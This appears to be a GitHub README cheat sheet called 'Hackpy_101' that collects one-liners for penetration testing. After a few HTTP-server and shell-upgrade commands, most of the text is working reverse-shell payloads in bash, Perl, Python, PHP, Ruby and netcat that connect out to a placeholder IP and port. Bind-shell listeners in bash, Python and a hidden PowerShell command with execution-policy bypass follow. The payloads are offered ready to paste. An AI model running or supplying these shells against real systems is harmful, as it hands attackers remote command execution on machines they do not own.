# Hackpy_101
Contains Various one liner scripts of python to help you in the Ethical hacking.

# For HTTP SERVER
Python2 :- python -m SimpleHTTPServer <port>
Python3 :- python -m  http.server <port>
To open a sever on specific IP we use -- bind 
For ex- python -m http.server port --bind <IP> 
If this doesnt work use python2 version.

# For Requesting a Interactive Shells
python -c 'import pty; pty.spawn("/bin/bash")'
This will upgrade a dumb shell to an interactive one
If this doesnt work for you then try doing this step wise\ 

**In reverse shell**\
$ python -c 'import pty; pty.spawn("/bin/bash")'\
Ctrl-Z\
**In Kali**\
$ stty raw -echo\
$ fg\
**In reverse shell**\
$ reset\
$ export SHELL=bash\
$ export TERM=xterm-256color\
$ stty rows <num> columns <cols>

**For Echo**\
echo 'os.system('/bin/bash')'\

**sh**\
/bin/sh -i\

**bash**\
/bin/bash -i\

**Perl**\
perl -e 'exec "/bin/sh";'\

**From within VI**\
:!bash

  
# THIS IS WHAT YOU CALL A CONNECTOR TO A LISTENER
**THIS IS USED FOR REVERSE CONNECTIONS.\
IF YOU DONT KNOW WHAT THIS MEANS --> "GOOGLE IT!!"\
YOU CAN USE EITHER OF THE METHODS, GIVEN THAT THE SPECIFIC LANGUAGE IS INSTALLED IN YOUR SYSTEM**
# BASH
bash -i >& /dev/tcp/IP/PORT 0>&1

# PERL
perl -e 'use Socket;$i="IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# PHP
php -r '$sock=fsockopen("IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby
ruby -rsocket -e'f=TCPSocket.open("IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Netcat
nc -e /bin/sh IP PORT

# OTHERS
r"m" /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP port >/tmp/f

# For Bind Shells.

# For Bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f

# For Python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'

# For Powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
